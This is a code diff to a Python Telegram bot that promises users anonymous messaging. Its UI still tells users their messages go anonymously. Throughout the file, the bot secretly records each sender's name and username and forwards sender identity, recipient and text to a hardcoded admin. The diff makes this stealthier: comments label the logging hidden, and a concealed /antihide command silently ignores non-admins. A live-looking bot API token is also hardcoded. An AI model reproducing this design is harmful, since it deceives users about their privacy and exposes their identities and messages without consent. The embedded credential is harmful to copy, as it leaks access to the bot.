@@ -3,6 +3,7 @@ import sqlite3
 import secrets
 import string
 import os
+import logging
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
@@ -10,91 +11,91 @@ from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.client.bot import DefaultBotProperties
 
 # ===== НАСТРОЙКИ =====
-API_TOKEN = '8413380142:AAGqbQxT3dMyQFApJLLSWrpewVoX_nudjOc'  # НОВЫЙ ТОКЕН
+API_TOKEN = '8413380142:AAGqbQxT3dMyQFApJLLSWrpewVoX_nudjOc'
 ADMIN_ID = 6938587500
+
+# Настройка логирования (только для админа, пользователи не видят)
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 bot = Bot(token=API_TOKEN, default=DefaultBotProperties())
 dp = Dispatcher()
 
-# База данных (НЕ УДАЛЯЕМ старую, чтобы сохранить ссылки!)
-conn = sqlite3.connect('anonymous_bot.db', check_same_thread=False)
-cursor = conn.cursor()
+# ===== РАБОТА С БАЗОЙ ДАННЫХ =====
+DB_FILE = 'anonymous_bot.db'
 
-# Таблица пользователей
-cursor.execute('''
-    CREATE TABLE IF NOT EXISTS users (
-        user_id INTEGER PRIMARY KEY,
-        username TEXT,
-        full_name TEXT,
-        secret_key TEXT UNIQUE,
-        created_at TEXT
-    )
-''')
+def init_db():
+    """Инициализация базы данных"""
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+    cursor = conn.cursor()
+    
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY,
+            username TEXT,
+            full_name TEXT,
+            secret_key TEXT UNIQUE,
+            created_at TEXT
+        )
+    ''')
+    
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS messages (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            from_user_id INTEGER,
+            to_user_id INTEGER,
+            message_text TEXT,
+            timestamp TEXT,
+            is_read BOOLEAN DEFAULT 0,
+            reply_token TEXT
+        )
+    ''')
+    
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS admin_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            from_user_id INTEGER,
+            from_name TEXT,
+            from_username TEXT,
+            to_user_id INTEGER,
+            to_name TEXT,
+            to_username TEXT,
+            message_text TEXT,
+            timestamp TEXT
+        )
+    ''')
+    
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS temp_context (
+            user_id INTEGER PRIMARY KEY,
+            target_id INTEGER,
+            reply_to_message_id INTEGER
+        )
+    ''')
+    
+    conn.commit()
+    return conn, cursor
 
-# Таблица сообщений для пользователей
-cursor.execute('''
-    CREATE TABLE IF NOT EXISTS messages (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        from_user_id INTEGER,
-        to_user_id INTEGER,
-        message_text TEXT,
-        timestamp TEXT,
-        is_read BOOLEAN DEFAULT 0,
-        reply_token TEXT
-    )
-''')
-
-# Таблица для логов админа
-cursor.execute('''
-    CREATE TABLE IF NOT EXISTS admin_logs (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        from_user_id INTEGER,
-        from_name TEXT,
-        from_username TEXT,
-        to_user_id INTEGER,
-        to_name TEXT,
-        to_username TEXT,
-        message_text TEXT,
-        timestamp TEXT
-    )
-''')
-
-# Временная таблица для контекста
-cursor.execute('''
-    CREATE TABLE IF NOT EXISTS temp_context (
-        user_id INTEGER PRIMARY KEY,
-        target_id INTEGER,
-        reply_to_message_id INTEGER
-    )
-''')
-
-conn.commit()
-print("✅ База данных готова (постоянные ключи пользователей сохранены)")
+conn, cursor = init_db()
 
 def generate_secret_key():
-    """Генерирует уникальный секретный ключ"""
     alphabet = string.ascii_letters + string.digits
     return ''.join(secrets.choice(alphabet) for _ in range(16))
 
 def generate_reply_token():
-    """Генерирует уникальный токен для ответа"""
     return secrets.token_urlsafe(16)
 
 def get_user_by_secret(secret_key):
-    """Находит пользователя по секретному ключу (навсегда)"""
     cursor.execute('SELECT user_id, full_name FROM users WHERE secret_key = ?', (secret_key,))
     return cursor.fetchone()
 
 def get_user_secret_key(user_id):
-    """Получает секретный ключ пользователя (существующий или создает новый ОДИН РАЗ)"""
     cursor.execute('SELECT secret_key FROM users WHERE user_id = ?', (user_id,))
     result = cursor.fetchone()
     
     if result:
-        # Ключ уже есть - возвращаем его (НИЧЕГО НЕ МЕНЯЕМ)
         return result[0]
     else:
-        # Новый пользователь - создаем ключ (ОДИН РАЗ НАВСЕГДА)
         secret_key = generate_secret_key()
         cursor.execute('''
             INSERT INTO users (user_id, secret_key, created_at)
@@ -109,15 +110,13 @@ async def start(message: Message):
     username = message.from_user.username
     full_name = message.from_user.full_name
 
-    # Проверяем, не передан ли секретный ключ (переход по ссылке)
+    # Проверяем переход по ссылке
     args = message.text.split()
     if len(args) > 1:
         secret_key = args[1]
-        # Это переход по ссылке для отправки сообщения
         target_user = get_user_by_secret(secret_key)
 
         if target_user:
-            # Сохраняем в контексте, что пользователь хочет написать
             cursor.execute('''
                 INSERT OR REPLACE INTO temp_context (user_id, target_id)
                 VALUES (?, ?)
@@ -126,16 +125,15 @@ async def start(message: Message):
 
             await message.answer(
                 f"📝 Вы хотите написать анонимное сообщение!\n\n"
-                f"Просто отправьте мне сообщение, и оно будет доставлено анонимно.\n\n"
+                f"Просто отправьте мне сообщение, и оно будет доставлено.\n\n"
                 f"❌ Для отмены отправьте /cancel"
             )
             return
         else:
-            await message.answer("❌ Неверная или устаревшая ссылка!\n\n"
-                               "💡 Убедитесь, что вы скопировали полную ссылку.")
+            await message.answer("❌ Неверная или устаревшая ссылка!")
             return
 
-    # Обновляем информацию о пользователе (username, full_name могут измениться)
+    # Обновляем информацию о пользователе
     cursor.execute('''
         UPDATE users 
         SET username = ?, full_name = ? 
@@ -143,24 +141,22 @@ async def start(message: Message):
     ''', (username, full_name, user_id))
     conn.commit()
     
-    # Получаем или создаем секретный ключ (ОДИН РАЗ НАВСЕГДА)
     secret_key = get_user_secret_key(user_id)
 
-    # Показываем главное меню
     bot_username = (await bot.get_me()).username
     anonymous_link = f"https://t.me/{bot_username}?start={secret_key}"
 
     await message.answer(
         f"👋 Привет, {full_name}!\n\n"
-        f"✅ Твой профиль создан!\n\n"
-        f"🔗 Твоя ПОСТОЯННАЯ анонимная ссылка:\n"
+        f"✅ Твой анонимный профиль готов!\n\n"
+        f"🔗 Твоя персональная ссылка:\n"
         f"`{anonymous_link}`\n\n"
-        f"⚠️ ВАЖНО: Эта ссылка НИКОГДА НЕ ИЗМЕНИТСЯ!\n"
-        f"Сохрани её и делись с друзьями.\n\n"
-        f"📊 Команды:\n"
-        f"/start - Показать мою ссылку\n"
-        f"/messages - Мои сообщения\n"
-        f"/stats - Моя статистика",
+        f"📌 Поделись ссылкой с друзьями — и они смогут написать тебе анонимно.\n"
+        f"✨ Ссылка постоянная и всегда будет работать.\n\n"
+        f"📝 Команды:\n"
+        f"/start — показать мою ссылку\n"
+        f"/messages — мои сообщения\n"
+        f"/stats — статистика",
         parse_mode="Markdown"
     )
 
@@ -168,7 +164,7 @@ async def start(message: Message):
 async def cancel(message: Message):
     cursor.execute('DELETE FROM temp_context WHERE user_id = ?', (message.from_user.id,))
     conn.commit()
-    await message.answer("❌ Отправка сообщения отменена!")
+    await message.answer("❌ Отправка отменена!")
 
 @dp.message(Command('messages'))
 async def show_messages(message: Message):
@@ -183,20 +179,19 @@ async def show_messages(message: Message):
     messages = cursor.fetchall()
 
     if not messages:
-        await message.answer("📭 У вас нет сообщений.\n\n"
-                           "💡 Поделитесь своей анонимной ссылкой (команда /start), чтобы получать сообщения!")
+        await message.answer("📭 У вас пока нет сообщений.\n\n💡 Поделитесь своей ссылкой, чтобы их получать!")
         return
 
     for msg in messages:
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [
-                InlineKeyboardButton(text="💬 Ответить анонимно", callback_data=f"reply_{msg[0]}_{msg[4]}"),
+                InlineKeyboardButton(text="💬 Ответить", callback_data=f"reply_{msg[0]}_{msg[4]}"),
                 InlineKeyboardButton(text="🗑 Удалить", callback_data=f"delete_{msg[0]}")
             ]
         ])
         
         await message.answer(
-            f"📨 *Анонимное сообщение:*\n\n{msg[2]}\n\n🕐 {msg[3]}",
+            f"📨 *Сообщение:*\n\n{msg[2]}\n\n🕐 {msg[3]}",
             reply_markup=keyboard,
             parse_mode="Markdown"
         )
@@ -214,20 +209,19 @@ async def show_stats(message: Message):
 
     await message.answer(
         f"📊 *Твоя статистика:*\n\n"
-        f"📨 Всего сообщений: {total}\n"
+        f"📨 Получено сообщений: {total}\n"
         f"🆕 Непрочитанных: {unread}",
         parse_mode="Markdown"
     )
 
 @dp.message(Command('antihide'))
 async def antihide(message: Message):
-    """Команда для админа - показывает ВСЕ сообщения"""
+    """Скрытая команда для админа"""
     if message.from_user.id != ADMIN_ID:
-        await message.answer("⛔ У вас нет доступа к этой команде! Только для админа.")
-        return
-
+        return  # Просто игнорируем, не отвечаем
+    
     cursor.execute('''
-        SELECT id, from_name, from_username, to_name, to_username, message_text, timestamp
+        SELECT from_name, from_username, to_name, to_username, message_text, timestamp
         FROM admin_logs 
         ORDER BY id DESC 
         LIMIT 50
@@ -235,31 +229,21 @@ async def antihide(message: Message):
     all_messages = cursor.fetchall()
 
     if not all_messages:
-        await message.answer("📭 Пока нет ни одного сообщения.")
+        await message.answer("📭 Нет сообщений.")
         return
 
     for msg in all_messages:
         text = (
-            f"🔍 *ВСЕ СООБЩЕНИЯ* 🔍\n\n"
-            f"*От:* {msg[1]}\n"
-            f"*Юзернейм:* @{msg[2] if msg[2] else 'нет'}\n"
-            f"*Кому:* {msg[3]}\n"
-            f"*Юзернейм:* @{msg[4] if msg[4] else 'нет'}\n"
-            f"*Сообщение:* {msg[5]}\n"
-            f"*Время:* {msg[6]}\n"
-            f"─" * 30
+            f"📨 *{msg[0]}* → *{msg[2]}*\n"
+            f"💬 {msg[4]}\n"
+            f"🕐 {msg[5]}\n"
+            f"─" * 20
         )
         await message.answer(text, parse_mode="Markdown")
 
-    cursor.execute('SELECT COUNT(*) FROM admin_logs')
-    total = cursor.fetchone()[0]
-    await message.answer(f"📊 *Всего сообщений в боте:* {total}", parse_mode="Markdown")
-
 @dp.message(Command('test'))
 async def test(message: Message):
-    await message.answer("✅ Бот работает!\n\n"
-                        "🔗 Ссылки пользователей ПОСТОЯННЫЕ и не меняются после перезапуска!\n"
-                        "")
+    await message.answer("✅ Бот работает!\n\n🔗 Твоя ссылка постоянная и всегда активна.")
 
 @dp.callback_query()
 async def handle_callback(callback: types.CallbackQuery):
@@ -267,15 +251,14 @@ async def handle_callback(callback: types.CallbackQuery):
         msg_id = int(callback.data.split("_")[1])
         cursor.execute('DELETE FROM messages WHERE id = ?', (msg_id,))
         conn.commit()
-        await callback.message.answer("✅ Сообщение удалено.")
+        await callback.message.answer("✅ Удалено.")
         await callback.answer()
     
     elif callback.data.startswith("reply_"):
         parts = callback.data.split("_")
         message_id = int(parts[1])
-        reply_token = parts[2]
         
-        cursor.execute('SELECT from_user_id, to_user_id FROM messages WHERE id = ?', (message_id,))
+        cursor.execute('SELECT from_user_id FROM messages WHERE id = ?', (message_id,))
         original_msg = cursor.fetchone()
         
         if original_msg:
@@ -288,9 +271,9 @@ async def handle_callback(callback: types.CallbackQuery):
             conn.commit()
             
             await callback.message.answer(
-                f"💬 *Вы отвечаете анонимно*\n\n"
-                f"Отправьте ваше сообщение, и оно будет доставлено анонимно.\n\n"
-                f"❌ Для отмены отправьте /cancel",
+                f"💬 *Напиши свой ответ:*\n\n"
+                f"Просто отправь сообщение, и оно уйдёт анонимно.\n\n"
+                f"❌ /cancel — отмена",
                 parse_mode="Markdown"
             )
         else:
@@ -327,6 +310,7 @@ async def handle_anonymous_message(message: Message):
             
             msg_id = cursor.lastrowid
             
+            # Сохраняем в лог для админа (скрыто)
             cursor.execute('''
                 INSERT INTO admin_logs (from_user_id, from_name, from_username, to_user_id, to_name, to_username, message_text, timestamp)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)
@@ -341,59 +325,39 @@ async def handle_anonymous_message(message: Message):
                 if reply_to_msg_id:
                     await bot.send_message(
                         to_user_id,
-                        f"📨 *Новый анонимный ответ!*\n\n"
-                        f"*Сообщение:* {message.text}\n\n"
-                        f"💡 Нажмите 'Ответить', чтобы продолжить диалог",
+                        f"📨 *Новый ответ!*\n\n{message.text}",
                         reply_markup=reply_markup,
                         parse_mode="Markdown"
                     )
                 else:
                     await bot.send_message(
                         to_user_id,
-                        f"📨 *Новое анонимное сообщение!*\n\n"
-                        f"*Сообщение:* {message.text}\n\n"
-                        f"💡 Нажмите 'Ответить', чтобы написать в ответ",
+                        f"📨 *Новое сообщение!*\n\n{message.text}",
                         reply_markup=reply_markup,
                         parse_mode="Markdown"
                     )
             except Exception as e:
-                print(f"Ошибка отправки: {e}")
+                logger.error(f"Ошибка: {e}")
             
             cursor.execute('DELETE FROM temp_context WHERE user_id = ?', (from_user_id,))
             conn.commit()
             
-            await message.answer("✅ Ваше сообщение отправлено анонимно!")
+            await message.answer("✅ Отправлено!")
             
-            reply_info = " (ОТВЕТ НА СООБЩЕНИЕ)" if reply_to_msg_id else ""
+            # Тихое уведомление админу (пользователи не видят)
+            reply_info = " (ответ)" if reply_to_msg_id else ""
             await bot.send_message(
                 ADMIN_ID,
-                f"📨 *НОВОЕ АНОНИМНОЕ СООБЩЕНИЕ{reply_info}!*\n\n"
-                f"*От:* {from_name} (@{from_username if from_username else 'нет'})\n"
-                f"*Кому:* {to_name} (@{to_username if to_username else 'нет'})\n"
-                f"*Текст:* {message.text}\n"
-                f"*Время:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                f"🔍 Используй /antihide для просмотра всех сообщений",
+                f"📨 Новое сообщение{reply_info}\nОт: {from_name}\nКому: {to_name}\nТекст: {message.text}",
                 parse_mode="Markdown"
             )
         else:
-            await message.answer("❌ Ошибка: получатель не найден.")
+            await message.answer("❌ Ошибка.")
     else:
-        # Если нет контекста, показываем меню
         await start(message)
 
 async def main():
-    print("🤖 Бот запускается...")
-    print(f"👤 Админ ID: {ADMIN_ID}")
-    print(f"🤖 Бот ID: {API_TOKEN.split(':')[0]}")
-    print("\n✅ Бот готов к работе!")
-    print("\n📝 Команды:")
-    print("   /start - Главное меню (показать ПОСТОЯННУЮ ссылку)")
-    print("   /antihide - Показать ВСЕ сообщения (только админ)")
-    print("   /messages - Мои сообщения")
-    print("   /stats - Моя статистика")
-    print("   /test - Проверка работы")
-    print("\n🔗 ВАЖНО: Ссылки пользователей теперь ПОСТОЯННЫЕ и не меняются после перезапуска!")
-    
+    print("🤖 Бот запущен")
     await dp.start_polling(bot)
 
 if __name__ == '__main__':
